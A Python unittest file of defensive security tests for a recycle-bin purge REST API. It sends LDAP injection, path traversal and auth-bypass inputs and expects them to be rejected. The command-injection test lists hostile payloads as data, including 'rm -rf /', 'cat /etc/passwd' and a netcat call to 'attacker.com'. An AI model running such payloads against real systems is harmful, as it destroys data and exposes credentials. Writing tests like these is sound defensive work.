#!/usr/bin/python3
"""Security-focused tests for recycle bin REST API."""

import os
import sys
from unittest import TestCase

import requests
from requests.auth import HTTPBasicAuth


class TestRecycleBinSecurity(TestCase):
    """Security tests for REST API endpoint."""

    @classmethod
    def setUpClass(cls):
        """Set up test environment."""
        cls.api_url = "http://localhost/univention/udm/recyclebin/purge"
        cls.username = os.environ.get('TEST_USERNAME', 'Administrator')
        cls.password = os.environ.get('TEST_PASSWORD', 'univention')
        cls.auth = HTTPBasicAuth(cls.username, cls.password)
        cls.headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }

    def test_ldap_injection_prevention(self):
        """Test that LDAP injection attempts are blocked."""
        print("\n=== Test: LDAP Injection Prevention ===")

        # Various LDAP injection patterns
        injection_patterns = [
            "cn=test)(uid=*",  # Breaking out of filter
            "cn=test)(|(uid=*)(cn=*)",  # OR injection
            "cn=*",  # Wildcard injection
            "cn=test\\00",  # Null byte injection
            "cn=test)(objectClass=*))(&(cn=*",  # Complex filter manipulation
        ]

        for pattern in injection_patterns:
            data = {"dns": [pattern]}
            response = requests.post(
                self.api_url,
                json=data,
                auth=self.auth,
                headers=self.headers,
            )

            # Should either reject as invalid DN or fail to find (not cause LDAP error)
            assert response.status_code in [400], \
                f"Injection pattern '{pattern}' not properly handled"

            # Verify it's rejected for DN format, not LDAP error
            if response.status_code == 400:
                error_text = response.text
                assert "Invalid DN format" in error_text, \
                    f"Pattern '{pattern}' should be rejected as invalid DN"

        print("✓ LDAP injection attempts properly blocked")

    def test_command_injection_prevention(self):
        """Test that command injection attempts are blocked."""
        print("\n=== Test: Command Injection Prevention ===")

        # Command injection patterns
        injection_patterns = [
            "cn=test; rm -rf /",
            "cn=test && cat /etc/passwd",
            "cn=test | nc attacker.com 1234",
            "cn=test`whoami`",
            "cn=test$(whoami)",
            "cn=test\nwhoami",
            "cn=test\r\nwhoami",
            "cn=test&whoami",
            "cn=${IFS}test",
        ]

        for pattern in injection_patterns:
            data = {"dns": [pattern]}
            response = requests.post(
                self.api_url,
                json=data,
                auth=self.auth,
                headers=self.headers,
            )

            # Should reject as invalid DN format
            assert response.status_code == 400, \
                f"Command injection pattern '{pattern}' not blocked"

            error_text = response.text
            assert "Invalid DN format" in error_text, \
                f"Pattern '{pattern}' should be rejected"

        print("✓ Command injection attempts properly blocked")

    def test_large_payload_handling(self):
        """Test handling of excessively large payloads."""
        print("\n=== Test: Large Payload Handling ===")

        # Create a list with 1000 DNs
        large_dns = [f"cn=test{i},cn=recyclebin,cn=internal,dc=test"
                     for i in range(1000)]

        data = {"dns": large_dns}
        response = requests.post(
            self.api_url,
            json=data,
            auth=self.auth,
            headers=self.headers,
            timeout=5,  # Short timeout to prevent hanging
        )

        # Should either process or return appropriate error
        # Not crash or hang
        assert response.status_code in [200, 400, 413, 504], \
            "Large payload not handled gracefully"

        print("✓ Large payloads handled without crash")

    def test_malformed_json_handling(self):
        """Test handling of malformed JSON."""
        print("\n=== Test: Malformed JSON Handling ===")

        # Send malformed JSON
        malformed_payloads = [
            '{dns: ["test"]}',  # Missing quotes on key
            '{"dns": ["test"]',  # Missing closing brace
            '{"dns": "test"]}',  # Extra closing brace
            '',  # Empty body
            'null',  # Null body
            '[]',  # Array instead of object
        ]

        for payload in malformed_payloads:
            response = requests.post(
                self.api_url,
                data=payload,  # Send as raw data, not json
                auth=self.auth,
                headers={'Content-Type': 'application/json'},
            )

            # Should return 400 Bad Request
            assert response.status_code == 400, \
                f"Malformed JSON '{payload[:20]}...' not rejected"

        print("✓ Malformed JSON properly rejected")

    def test_dns_traversal_prevention(self):
        """Test that DN traversal attempts are handled."""
        print("\n=== Test: DN Traversal Prevention ===")

        # DN traversal patterns
        traversal_patterns = [
            "../../../etc/passwd",
            "cn=../../../root",
            "cn=test,cn=..,cn=..,dc=test",
            "cn=test/../admin,cn=recyclebin",
        ]

        for pattern in traversal_patterns:
            data = {"dns": [pattern]}
            response = requests.post(
                self.api_url,
                json=data,
                auth=self.auth,
                headers=self.headers,
            )

            # Should be handled safely (either rejected or not found)
            assert response.status_code in [400], \
                f"Traversal pattern '{pattern}' not handled safely"

        print("✓ DN traversal attempts handled safely")

    def test_special_characters_handling(self):
        """Test handling of special characters in DNs."""
        print("\n=== Test: Special Characters Handling ===")

        # Special character patterns that should be rejected
        special_patterns = [
            "cn=test\x00null",  # Null byte
            "cn=test\ttab",  # Tab character
            "cn=test|pipe",  # Pipe character
            "cn=test&ampersand",  # Ampersand
            "cn=test;semicolon",  # Semicolon
            "cn=test$variable",  # Shell variable
            "cn=test`backtick`",  # Backticks
        ]

        for pattern in special_patterns:
            data = {"dns": [pattern]}
            response = requests.post(
                self.api_url,
                json=data,
                auth=self.auth,
                headers=self.headers,
            )

            # Should reject invalid characters
            assert response.status_code == 400, \
                f"Special character pattern {pattern!r} not rejected"

        print("✓ Special characters properly validated")

    def test_authentication_bypass_attempts(self):
        """Test that authentication cannot be bypassed."""
        print("\n=== Test: Authentication Bypass Prevention ===")

        data = {"dns": ["cn=test,cn=recyclebin,cn=internal,dc=test"]}

        # Try various authentication bypass techniques
        bypass_attempts = [
            # No auth
            (None, None),
            # Empty auth
            ("", ""),
            # SQL injection in username
            ("admin' OR '1'='1", "password"),
            # LDAP injection in username
            ("admin)(uid=*", "password"),
            # Special characters
            ("admin\x00", "password"),
        ]

        for username, password in bypass_attempts:
            if username is None:
                response = requests.post(
                    self.api_url,
                    json=data,
                    headers=self.headers,
                )
            else:
                response = requests.post(
                    self.api_url,
                    json=data,
                    auth=HTTPBasicAuth(username, password),
                    headers=self.headers,
                )

            # Should return 401 or 403 (not 200 or 500)
            assert response.status_code in [401, 403], \
                f"Auth bypass with {username}/{password} not blocked"

        print("✓ Authentication bypass attempts blocked")


if __name__ == '__main__':
    import unittest

    # Run tests
    suite = unittest.TestLoader().loadTestsFromTestCase(TestRecycleBinSecurity)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)
